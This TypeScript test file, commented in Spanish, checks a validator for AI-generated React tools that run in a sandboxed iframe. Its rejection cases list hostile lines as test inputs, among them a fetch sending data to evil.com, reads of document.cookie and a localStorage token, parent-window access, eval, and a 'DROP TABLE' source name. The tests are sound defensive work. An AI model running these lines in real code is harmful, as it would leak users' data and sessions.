import {
  compilar,
  datosParaHerramienta,
  extraerCodigo,
  importsDe,
  muestraDeDatos,
  revisarCodigo,
  validarPlanHerramienta,
} from './herramientas';

/**
 * Las herramientas a medida (G6): lo que el modelo manda pasa por acá antes
 * de llegar al iframe. Primera barrera; la segunda es el aislamiento.
 */

const BUENO = `
import React, { useMemo, useState } from "react";
import { BarChart, Bar, XAxis, YAxis, Tooltip, ResponsiveContainer } from "recharts";

type Props = { datos: any; proponer: (a: unknown) => void };

export default function Herramienta({ datos, proponer }: Props) {
  const [suba, setSuba] = useState(10);
  const top = datos.productos.filas;
  const filas = useMemo(() => top.map((f: any) => ({ ...f, nuevo: f.precio * (1 + suba / 100) })), [top, suba]);
  const item = { parent: 1 };
  return (
    <div className="p-4">
      <input type="range" value={suba} onChange={(e) => setSuba(Number(e.target.value))} />
      <span>{item.parent}</span>
      <ResponsiveContainer width="100%" height={200}>
        <BarChart data={filas}><XAxis dataKey="producto" /><YAxis /><Tooltip /><Bar dataKey="nuevo" /></BarChart>
      </ResponsiveContainer>
      <button onClick={() => proponer({ tipo: "precios", cambios: filas.map((f: any) => ({ productId: f._productId, precio: f.nuevo })) })}>Aplicar</button>
    </div>
  );
}
`;

describe('el plan', () => {
  it('fuentes del catálogo con alias y params normalizados', () => {
    const { plan, errores } = validarPlanHerramienta({
      titulo: 'Simulador de precios de bebidas',
      descripcion: 'Mové el porcentaje y mirá ventas y margen.',
      fuentes: [{ alias: 'productos', fuente: 'precios_por_producto', params: { buscar: '  bebidas ' } }],
    });
    expect(errores).toEqual([]);
    expect(plan!.fuentes[0]).toEqual({ alias: 'productos', fuente: 'precios_por_producto', params: { buscar: 'bebidas', limite: 50 } });
  });

  it('una fuente inventada, un alias raro o repetido, no', () => {
    const { errores } = validarPlanHerramienta({
      titulo: 'x',
      fuentes: [
        { alias: 'a', fuente: 'DROP TABLE', params: {} },
        { alias: 'Mal-Alias', fuente: 'kpis', params: {} },
        { alias: 'b', fuente: 'kpis', params: {} },
        { alias: 'b', fuente: 'top_productos', params: {} },
      ],
    });
    expect(errores.join(' | ')).toMatch(/no existe.*minúsculas.*repetido/);
  });

  it('el filtro de texto se acota (no se le pasa a la base un texto de 10.000 letras)', () => {
    const { plan } = validarPlanHerramienta({ titulo: 'x', fuentes: [{ alias: 'p', fuente: 'precios_por_producto', params: { buscar: 'a'.repeat(500) } }] });
    expect((plan!.fuentes[0].params.buscar as string).length).toBe(60);
  });
});

describe('el código', () => {
  it('un componente normal pasa (sin falsos positivos: top.map, item.parent)', () => {
    expect(revisarCodigo(BUENO)).toEqual([]);
  });

  it.each([
    ['fetch("https://evil.com?d=" + x)', 'red'],
    ['new XMLHttpRequest()', 'red'],
    ['navigator.sendBeacon("x", d)', 'red'],
    ['await import("https://x")', 'import()'],
    ['eval("1+1")', 'eval'],
    ['new Function("return 1")()', 'eval'],
    ['localStorage.getItem("token")', 'almacenamiento'],
    ['document.cookie', 'almacenamiento'],
    ['window.parent.document.body', 'ventana de Vendfy'],
    ['top.location', 'ventana de Vendfy'],
    ['window.top.postMessage(x, "*")', 'ventana de Vendfy'],
    ['location.href = "https://evil.com"', 'navegar'],
    ['window.open("https://evil.com")', 'navegar'],
    ['<div dangerouslySetInnerHTML={{ __html: x }} />', 'HTML crudo'],
    ['new Worker("x.js")', 'workers'],
  ])('rechaza %s', (linea, motivo) => {
    const problemas = revisarCodigo(BUENO.replace('const item = { parent: 1 };', `const item = { parent: 1 }; ${linea};`));
    expect(problemas.join(' ')).toContain(motivo);
  });

  it('solo se importa react y recharts', () => {
    expect(importsDe(BUENO)).toEqual(['react', 'recharts']);
    const conIconos = 'import { Tag } from "lucide-react";\n' + BUENO;
    expect(revisarCodigo(conIconos).join(' ')).toContain('No se puede importar "lucide-react"');
  });

  it('sin export default no hay componente', () => {
    expect(revisarCodigo(BUENO.replace('export default ', ''))).toContain('Falta `export default` del componente');
  });

  it('compila a CommonJS con React.createElement', () => {
    const { codigo, errores } = compilar(BUENO);
    expect(errores).toEqual([]);
    expect(codigo).toContain('require("react")');
    expect(codigo).toContain('require("recharts")');
    expect(codigo).toContain('createElement');
    expect(codigo).toContain('exports.default');
  });

  it('un error de sintaxis vuelve con su línea', () => {
    const { codigo, errores } = compilar('export default function H() {\n  return <div>\n}\n');
    expect(codigo).toBeNull();
    expect(errores[0]).toMatch(/^línea \d+:/);
  });

  it('el código de una respuesta envuelta en ```tsx', () => {
    expect(extraerCodigo('Acá va:\n```tsx\nexport default 1\n```\nListo')).toBe('export default 1');
    expect(extraerCodigo('export default 2')).toBe('export default 2');
  });
});

describe('los datos', () => {
  const tablas = {
    productos: {
      columnas: [{ clave: 'producto', titulo: 'Producto', tipo: 'producto' as const }],
      filas: [{ producto: 'Coca', _imagen: 'https://x/coca.jpg', _productId: 'p1', _storeProductId: 'sp1', precio: 12 }],
    },
  };

  it('sin fotos (el iframe no carga imágenes de afuera), con los ids para proponer', () => {
    expect(datosParaHerramienta(tablas).productos.filas[0]).toEqual({ producto: 'Coca', _productId: 'p1', _storeProductId: 'sp1', precio: 12 });
  });

  it('la muestra para el modelo dice columnas, ocultas y cuántas filas hay', () => {
    expect(muestraDeDatos(tablas).productos).toMatchObject({
      columnas: ['producto (producto): Producto'],
      ocultas: ['_imagen', '_productId', '_storeProductId'],
      total_filas: 1,
    });
  });
});
